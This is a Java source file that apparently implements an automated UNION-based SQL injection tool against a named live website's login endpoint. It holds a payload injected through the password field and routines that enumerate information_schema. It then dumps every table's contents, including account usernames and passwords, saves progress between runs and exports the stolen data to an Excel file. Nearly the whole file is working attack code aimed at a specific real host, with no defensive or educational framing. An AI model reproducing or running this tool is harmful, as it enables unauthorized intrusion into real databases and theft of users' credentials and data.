package demo.pluto.maven;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import org.apache.commons.httpclient.Header;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpException;
import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.NameValuePair;
import org.apache.commons.httpclient.URI;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.params.HttpMethodParams;
import org.apache.commons.lang.StringUtils;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.apache.struts.taglib.tiles.GetAttributeTag;

import com.itextpdf.text.pdf.PdfStructTreeController.returnType;


public class HttpTest {
    private static HttpClient httpClient = new HttpClient();
    public static void main(String[] args) {

//        resetDatabase();
//        downloadDatabase();
//        redownloadDatabase("keyvalue");
        printDatabase();
        

    }
    
    /**
     * 手动设置database当前状态
     * @author A4YL9ZZ 
     */
    public static void resetDatabase(){
        Database database =null;
        String databaseName = "zwcwu";
        Object obj= readObjectFromFile(databaseName);
        if(obj!=null && obj instanceof Database){
            database = (Database) obj;
            database.setCurrentTableIndex(12);
            List<Table> tableList = database.getTableList();
            for(Table talbe:tableList){
                if(talbe.getTableName().equals("keyvalue")){
                    talbe.setCurrentColumn(0);
                    talbe.setCurrentRow(0);
                    break;
                }
            }
            writeObjectToFile(database,databaseName);
        }
    }


    
    
    /**
     * 输出database数据
     * @author A4YL9ZZ 
     */
    public static void printDatabase(){
        Database database =null;
        String databaseName = "zwcwu";
        Object obj= readObjectFromFile(databaseName);
        if(obj!=null && obj instanceof Database){
            database = (Database) obj;
            System.out.println(database.getDatabaseName());
            //输出到Excel
            Workbook workbook  = new XSSFWorkbook();
            List<Table> tableList = database.getTableList();
            
            //输出Table Summary信息
            Sheet tableListSheet = workbook.createSheet("tableList");
            Row titleRow = tableListSheet.createRow(0);
            titleRow.createCell(0).setCellValue("TableName");
            titleRow.createCell(1).setCellValue("MaxRows");
            titleRow.createCell(2).setCellValue("Columns");
            

            for(int i=0;i<tableList.size();i++){
                
                Table table = tableList.get(i);
                System.out.println(table);
                Row row = tableListSheet.createRow(i+1);
                row.createCell(0).setCellValue(table.getTableName());
                row.createCell(1).setCellValue(table.getTotalRows());
                row.createCell(2).setCellValue(table.getMaxColumns());
            }
            
            //输出明细信息
            for(Table table:tableList){
                Sheet sheet = workbook.createSheet(table.getTableName());
                
                String[] fieldNames = table.getFieldNames();
                if(fieldNames!=null){  
                    Row tRow = sheet.createRow(0);
                    for(int i=0;i<fieldNames.length;i++){ //输出字段名
                        tRow.createCell(i).setCellValue(fieldNames[i]);
                    }

                    
                }
                String[][] datas=table.getDatas();
                int maxRows = table.getTotalRows();
                int maxColumns = table.getMaxColumns();
                if(datas!=null){
                    for(int x=0;x<maxRows;x++){
                        Row row = sheet.createRow(x+1);
                        for(int y=0;y<maxColumns;y++){
                            row.createCell(y).setCellValue(datas[y][x]);
                        }
                    } 
                }
                
                
            }
            
            //输出到文件
            String fileName="./data/database.xlsx";
            try {
                File file = new File(fileName);
                if(file.exists()){
                    file.delete();
                }
                file.createNewFile();
                FileOutputStream fos = new FileOutputStream(file);
                
                workbook.write(fos); 
                fos.flush();
                fos.close();
            } catch (FileNotFoundException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            
        }
        
        
    }
    

    /**
     * 下载databas数据
     * @author A4YL9ZZ 
     */
    public static void downloadDatabase(){
        Database database =null;
        String databaseName="zwcwu";
        Object obj= readObjectFromFile(databaseName);
        if(obj!=null && obj instanceof Database){
            database = (Database) obj;
            System.out.println(database.getDatabaseName());
        }else{
            database = new Database(); 
            
            database.setDatabaseName(databaseName);
        }

        writeObjectToFile(database,databaseName);
        listTables(database,null);
        
        
        
    }
    
    /**
     * 重新下载指定的Databse的Table数据
     * @author A4YL9ZZ 
     * @param tableName
     */
    public static void redownloadDatabase(String tableName){
        Database database =null;
        String databaseName="zwcwu";
        Object obj= readObjectFromFile(databaseName);
        if(obj!=null && obj instanceof Database){
            database = (Database) obj;
            System.out.println(database.getDatabaseName());
        }else{
            database = new Database(); 
            
            database.setDatabaseName(databaseName);
        }

        writeObjectToFile(database,databaseName);
        listTables(database,null);
    }
    
    

    public static void downloadDatabaseWithTable(String tableName){
        Database database =null;
        String databaseName="zwcwu";
        Object obj= readObjectFromFile(databaseName);
        if(obj!=null && obj instanceof Database){
            database = (Database) obj;
            System.out.println(database.getDatabaseName());
        }else{
            database = new Database(); 
            
            database.setDatabaseName(databaseName);
        }

        writeObjectToFile(database,databaseName);
        listTables(database,tableName);
        
    }
    
    
    public static void listTables(Database database,String tableName){
        //select 1 as id,group_concat(t.id,\"|\",t.username) AS username,\"\" as password, null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from (select *  from account order by id desc  limit 60,20) as t where \"1\"=\"1";
        //先获取数据库中table数量
        if(fillTableCount(database)){
            //再获取表名称
            if(fillTableNameList(database)){
                //获取具体的每张表的信息
                fillTableList(database,tableName);
            }
        }

   
    }
    
    /**
     * 填充表数量
     * @author A4YL9ZZ 
     * @param database
     */
    public static boolean fillTableCount(Database database){
        //先获取数据库中table数量
        int tableCount = database.getTableCount();

        String sql= formatSql("CONVERT(count(*),CHAR)",String.format("select * from information_schema.tables  where table_schema=\"%s\" ",database.getDatabaseName()));
        String result = processSql(sql);
        if(!result.isEmpty()){
            tableCount = Integer.parseInt(result); 
            database.setTableCount(tableCount);
            writeObjectToFile(database,database.getDatabaseName()); //保存
            return true;
        }else{
            return false ; //异常直接结束
        }

    }
    
    /**
     * 填充表名
     * @author A4YL9ZZ 
     * @param database
     * @return
     */
    public static boolean fillTableNameList(Database database){
        int tableCount = database.getTableCount();
        List<String> tableNameList = database.getTableNameList();
        String databaseName = database.getDatabaseName();
        if(tableNameList==null ||tableNameList.size() !=tableCount ){  //table名称列表只要没有处理完成，每次都重新处理
            tableNameList = new ArrayList<String>(tableCount);
            database.setTableNameList(tableNameList);
            //获取table列表
            for (int i=0;i<tableCount;i+=10){
                String sql= formatSql("group_concat(t.table_name)",String.format("select * from information_schema.tables  where table_schema=\"%s\" limit %d,10 ",databaseName,i));
                String result = processSql(sql);
                if(!result.isEmpty()){
                    String[] results= result.split(",");
                    tableNameList.addAll(Arrays.asList(results)); 
                }else{
                    return false; //异常直接结束
                }

            }
            writeObjectToFile(database,database.getDatabaseName()); //保存
            return true;
            
        }else{
            return true;
        }
        
    }
    
    /**
     * 填充每张表
     * @author A4YL9ZZ 
     * @param database
     * @return
     */
    public static boolean fillTableList(Database database,String tableName){
        int tableCount = database.getTableCount();
        List<String> tableNameList = database.getTableNameList();
        List<Table> tableList = database.getTableList();
        int currentTableIndex = database.getCurrentTableIndex();
        
        if(fillTableListSummaryInfo(database)){ 
            if(tableName!=null){//指定表名模式还是默认顺序处理模式
                Table table=null;
                //获取table字段列表
                for(int i=0 ;i<tableCount;i++){
                    table = tableList.get(i);
                    if(table.getTableName().equals(tableName)){
                        //获取table字段名列表
                        if(!fillTalbeFieldNames(database,table)){
                            return false;
                        }
                        break;
                    }

                }
                
                writeObjectToFile(database,database.getDatabaseName()); //保存
                if(!fillTableDatas(database,table)){
                    return false;
                }
                writeObjectToFile(database,database.getDatabaseName()); //保存
                return true;
                
            }else{
                
                //获取table字段列表
                for(int i=0 ;i<tableCount;i++){
                    Table table = tableList.get(i);
                    //获取table字段名列表
                    if(!fillTalbeFieldNames(database,table)){
                        return false;
                    }
                }
                writeObjectToFile(database,database.getDatabaseName()); //保存
                
                //获取具体的数据
                for(;currentTableIndex<tableCount;currentTableIndex++){
                    
                    Table table = tableList.get(currentTableIndex);
                    if(!fillTableDatas(database,table)){
                        return false;
                    }
                    database.setCurrentTableIndex(currentTableIndex);
                }
                writeObjectToFile(database,database.getDatabaseName()); //保存
                return true;
                
            }
            

        }else{
            return false;
        }
        


    }

    /**
     * 填充table列表中的表的总信息
     * @author A4YL9ZZ 
     * @param database
     * @return
     */
    public static boolean fillTableListSummaryInfo(Database database){
        int tableCount = database.getTableCount();
        List<String> tableNameList = database.getTableNameList();
        List<Table> tableList = database.getTableList();
        int currentTableIndex = database.getCurrentTableIndex();
        if(tableList ==null || tableList.size()!=tableCount){ //若表有修改，重新抓
            tableList = new ArrayList<Table>(tableCount);
            currentTableIndex = 0;
            database.setTableList(tableList);
            database.setCurrentTableIndex(currentTableIndex);
            for(int i=0 ;i<tableCount;i++){
                Table table = new Table();
                table.setTableName(tableNameList.get(i));
                //获取字段总数
                if(!countTalbeColumns(database,table)){
                    return false;
                }
                
                //获取记录总数
                if(!countTalbeRows(table)){
                    return false;
                }
                
                tableList.add(table);
            }
            
            writeObjectToFile(database,database.getDatabaseName()); //保存
        }
        return true;
    }
    
    
    /**
     * 统计表的字段数
     * @author A4YL9ZZ 
     * @param database
     * @param table
     * @return
     */
    public static boolean countTalbeColumns(Database database,Table table){
        String sql= formatSql("CONVERT(count(*),CHAR)",String.format("select * from information_schema.columns  where table_schema=\"%s\" and table_name=\"%s\" ",database.getDatabaseName(),table.getTableName()));
        String result = processSql(sql);
        if(!result.isEmpty()){
            int count = Integer.parseInt(result); 
            table.setMaxColumns(count);
            return true;
        }else{
            return false;
        }
    }
    
    /**
     * 统计表的记录数
     * @author A4YL9ZZ 
     * @param table
     * @return
     */
    public static boolean countTalbeRows(Table table){
        String sql= formatSql("CONVERT(count(*),CHAR)",String.format("select * from %s ",table.getTableName()));
        String result = processSql(sql);
        if(!result.isEmpty()){
            int count = Integer.parseInt(result); 
            table.setTotalRows(count);
            return true;
        }else{
            return false;
        }
    }
    
    
    /**
     * 填充字段名列表
     * @author A4YL9ZZ 
     * @param database
     * @param table
     * @return
     */
    public static boolean fillTalbeFieldNames(Database database,Table table){
        String[] fieldNames = table.getFieldNames();
        if(fieldNames==null){
            int count = table.getMaxColumns();
            int step = 10;
            String databaseName = database.getDatabaseName();
            String tableName = table.getTableName();
            List<String> list = new ArrayList<String>(count);
            for(int i=0;i<count;i+=step){
                String sql= formatSql("group_concat(t.column_name)",String.format("select * from information_schema.columns  where table_schema=\"%s\" and table_name=\"%s\" limit %d,%d",databaseName,tableName,i,step));
                String result = processSql(sql);
                if(!result.isEmpty()){
                    list.addAll(Arrays.asList(result.split(",")));
                }else{
                    return false;
                }
            }
            fieldNames = list.toArray(new String[count]);
            table.setFieldNames(fieldNames);
            return true;
        }else{
            return true;
        }

    }
    
    /**
     * 填充表格数据
     * @author A4YL9ZZ 
     * @param database
     * @param table
     * @return
     */
    public static boolean fillTableDatas(Database database,Table table){
        String tableName = table.getTableName();
        String[] fieldName = table.getFieldNames();
        String[][] datas = table.getDatas();
        int currentRow = table.getCurrentRow();
        int rows = table.getTotalRows();
        int columns = table.getMaxColumns();
        int currentColumn = table.getCurrentColumn();
        int step = 10;
        if(datas==null){
            datas = new String[columns][rows];
            currentColumn = 0;
            currentRow=0;
            table.setDatas(datas);
        }

        
        for(;currentColumn<columns;currentColumn++){
            
            for(;currentRow<rows;currentRow+=step){
                
                String sql= formatSql("group_concat(t.valueStr SEPARATOR \"||\")",
                        String.format("select %s.%s as valueStr from %s limit %d,%d",tableName,fieldName[currentColumn],tableName,currentRow,rows-currentRow>step?step:rows-currentRow ));
                String result = processSql(sql);
                
                String[] results = result.split("\\|\\|");
                for(int i=0;i<results.length;i++){
                    datas[currentColumn][i+currentRow]= results[i];
                }
                table.setCurrentColumn(currentColumn);
                table.setCurrentRow(currentRow);
                table.setDatas(datas);
                writeObjectToFile(table,table.getTableName());
                writeObjectToFile(database,database.getDatabaseName()); //保存

            
            }
            
            currentRow=0;
            
        }
        
        return true;
        
        
    }
    
    
    /**
     * 格式化查询SQL语句
     * @author A4YL9ZZ 
     * @param userName
     * @param tableSql
     * @return
     */
    public static String formatSql(String userName,String tableSql){
        return String.format("4944299\" or 2=1 union select 1 as id,%s AS username,\"\" as password, null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from (%s) as t where \"1\"=\"1",userName,tableSql);
        
    }
    
 
    /**
     * 执行SQL
     * @author A4YL9ZZ 
     * @param sql
     * @return
     */
    public static String processSql(String sql){
        String redirectDomain = "http://zwcwu.gotoip1.com/xiyou/";
        String url ="http://zwcwu.gotoip1.com/xiyou/jump.php";

        String process =sql; 
        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
        nameValuePairs.add(new NameValuePair("class", "Login"));
        nameValuePairs.add(new NameValuePair("type", "login"));
        nameValuePairs.add(new NameValuePair("username", "123456"));
        nameValuePairs.add(new NameValuePair("password", process));
        for (int i=0;i<5;i++){  //每个URL自动重试五次
            String result = resolveResult(sendPostHTTP(httpClient, url,redirectDomain,nameValuePairs));
            if(!result.isEmpty()){
                System.out.println(result);
                return result;
            }
        }
        return "";

    }
    
    /**
     * 解析结果
     * @author A4YL9ZZ 
     * @param reusltVaule
     * @return
     */
    public static String resolveResult(String reusltVaule){
         int s = reusltVaule.indexOf("setCookie(\"username\",\"");
         int e = reusltVaule.indexOf("\");", s);
         if(s>0 && e>s){
             return reusltVaule.substring(s+22,e);
         }else{
             return "";
         }
         
    }
    

    /**
     * 发送HTTP请求
     * @author A4YL9ZZ 
     * @param httpClient
     * @param url 请求的URL
     * @param redirectDomain 转向后相对路径的服务器URL
     * @param nameValuePairs POST请求的参数
     * @return 页面的全部内容
     */
    public static String sendPostHTTP(HttpClient httpClient, String url, String redirectDomain, List<NameValuePair> nameValuePairs) {
        String resultValue = "";
        PostMethod postMethod = createDefaultPostMethod(url, nameValuePairs);

        // 执行postMethod
        try {
            int statusCode = httpClient.executeMethod(postMethod);
            System.out.println("Status:" + statusCode);
            if (statusCode == HttpStatus.SC_MOVED_PERMANENTLY || statusCode == HttpStatus.SC_MOVED_TEMPORARILY) {
                // 从头中取出转向的地址
                Header locationHeader = postMethod.getResponseHeader("location");

                String location = null;
                if (locationHeader != null) {
                    location = locationHeader.getValue();
                    System.out.println("The page was redirected to:" + location);
                    resultValue = sendPostHTTP(httpClient,redirectDomain+location,redirectDomain,null);

                } else {
                    System.err.println("Location field value is null.");
                }
            } else if (statusCode == HttpStatus.SC_OK) {
                resultValue = postMethod.getResponseBodyAsString();
                // int s = body.indexOf("setCookie(\"username\",\"");
                // int e = body.indexOf("\");", s);
                // resultValue = body.substring(s+21,e);
                // System.out.println(resultValue);
            }

        } catch (HttpException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } finally {
            postMethod.releaseConnection();

        }


        return resultValue;
    }


    /**
     * 创建默认的Post Method <br/>
     * User-Agent : Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
     * Chrome/58.0.3029.110 Safari/537.36 <br/>
     * Conten-charset : utf-8
     * 
     * @author A4YL9ZZ 
     * @param url
     * @param nameValuePairs
     * @return
     */
    public static PostMethod createDefaultPostMethod(String url, List<NameValuePair> nameValuePairs) {
        PostMethod postMethod = new PostMethod(url);
        if(nameValuePairs!=null){
            postMethod.setRequestBody((NameValuePair[]) nameValuePairs.toArray(new NameValuePair[0]));  
        }
       
        postMethod.getParams().setParameter(HttpMethodParams.HTTP_CONTENT_CHARSET, "utf-8");
        postMethod.setRequestHeader("User-Agent",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36");
        // postMethod.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        // postMethod.setRequestHeader("Cache-Control", "max-age=0");
        // postMethod.setRequestHeader("Accept",
        // "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        // postMethod.setRequestHeader("Accept-Encoding", "gzip, deflate");
        // postMethod.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8");
        // postMethod.setRequestHeader("Origin", "http://cndvweb06");
        // postMethod.setRequestHeader("Upgrade-Insecure-Requests", "1");
        // postMethod.setFollowRedirects(true);
        // postMethod.addParameter("class", "Login");
        // postMethod.addParameter("type", "login");


        return postMethod;
    }

    /**
     * 设置代理
     * 
     * @author A4YL9ZZ 
     * @param httpClient
     */
    public static void initProxy(HttpClient httpClient) {
        final String proxyHost = "127.0.0.1";
        final String proxyPort = "8888";
        if (StringUtils.isNotEmpty(proxyHost) && StringUtils.isNotEmpty(proxyPort)) {
            httpClient.getHostConfiguration().setProxy(proxyHost, Integer.parseInt(proxyPort));
        }
    }

    
    
    /**
     * 保存对象
     * @author A4YL9ZZ 
     * @param obj
     */
    public static void writeObjectToFile(Object obj,String fileName)
    {
        File file =new File("./data/"+fileName);
        FileOutputStream out;
        try {
            out = new FileOutputStream(file);
            ObjectOutputStream objOut=new ObjectOutputStream(out);
            objOut.writeObject(obj);
            objOut.flush();
            objOut.close();
            System.out.println("write object success!");
        } catch (IOException e) {
            System.out.println("write object failed");
            e.printStackTrace();
        }
    }
    
    public static Object readObjectFromFile(String fileName)
    {
        Object temp=null;
        File file =new File("./data/"+fileName);
        FileInputStream in;
        try {
            in = new FileInputStream(file);
            ObjectInputStream objIn=new ObjectInputStream(in);
            temp=objIn.readObject();
            objIn.close();
            System.out.println("read object success!");
        } catch (IOException e) {
            System.out.println("read object failed");
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        return temp;
    }

}
